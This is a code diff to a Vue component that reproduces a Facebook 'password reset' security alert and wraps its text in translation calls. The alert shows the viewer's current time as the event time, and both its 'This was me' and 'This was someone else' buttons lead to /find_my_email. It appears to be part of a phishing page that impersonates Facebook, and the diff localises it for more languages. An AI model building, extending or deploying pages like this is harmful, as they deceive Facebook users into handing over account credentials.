@@ -41,24 +41,26 @@ onMounted(() => {
         <p
           class="max-md:text-[14px] max-md:block hidden ml-1 text-[16px] text-[#162643] font-semibold"
         >
-          You may have performed this action yourself
+          {{ $t('You may have performed this action yourself') }}
         </p>
       </div>
 
       <div class="max-md:mx-[10px] md:px-5 md:pt-[10px]">
         <p class="text-[12px] my-[10px] max-md:mt-0">
-          This action came from a network you have used before to access Facebook:
+          {{ $t('This action came from a network you have used before to access Facebook:') }}
         </p>
 
         <p class="text-[12px]">
-          <strong>Password reset</strong> on
+          <strong>{{ $t('Password reset') }}</strong> {{ $t('on') }}
           <strong>{{ new Date().toLocaleString('en-US', options) }}</strong>
         </p>
 
         <p class="text-[12px] my-[10px]">
-          If this was not you, you can secure your account. You may need to pass a security
-          <br class="max-md:hidden" />
-          challenge, create a new password, and update your account before you can log in.
+          {{
+            $t(
+              'If this was not you, you can secure your account. You may need to pass a security challenge, create a new password, and update your account before you can log in.',
+            )
+          }}
         </p>
       </div>
 
@@ -69,13 +71,13 @@ onMounted(() => {
           href="/find_my_email"
           class="btn-2 btn-mobile max-md:w-full w-fit border border-[#ccd0d5] rounded-[2px] px-[10px] flex justify-center items-center text-[#4b4f56] bg-[#f5f6f7] md:h-[28px]"
         >
-          This was someone else
+          {{ $t('This was someone else') }}
         </a>
         <a
           href="/find_my_email"
           class="btn-1 btn-mobile max-md:w-full w-fit md:ml-1 bg-[#4267b2] border border-[#4267b2] rounded-[2px] px-[10px] flex justify-center items-center text-white md:h-[28px]"
         >
-          This was me
+          {{ $t('This was me') }}
         </a>
       </div>
     </div>
